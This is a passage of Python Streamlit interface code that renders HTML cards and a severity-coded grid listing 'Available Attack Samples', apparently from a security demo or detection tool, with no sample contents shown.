            <div class="fcard" style="--c:{col_c}">
              <div class="fcard-tag" style="color:{col_c}">{tag}</div>
              <div class="fcard-title">{title}</div>
              <div class="fcard-desc">{desc}</div>
            </div>
            """, unsafe_allow_html=True)

    st.markdown('<div class="section-h">Available Attack Samples</div>', unsafe_allow_html=True)

    sample_names = [k for k in SAMPLES.keys() if not k.startswith('—')]
    cols = st.columns(3)
    for i, name in enumerate(sample_names):
        col_c = SAMPLE_COLORS.get(name, '#86868b')
        tag_text = ('CRITICAL' if col_c == '#ff3860' else
                    'HIGH'     if col_c == '#ff9500' else
                    'MEDIUM'   if col_c == '#ffcc00' else
                    'BENIGN')
        with cols[i % 3]:
            st.markdown(f"""
            <div class="schip" style="--c:{col_c}; margin-bottom: 10px;">
              <div class="schip-dot"></div>
              <div class="schip-name">{name}</div>
              <div class="schip-tag">{tag_text}</div>
            </div>
            """, unsafe_allow_html=True)
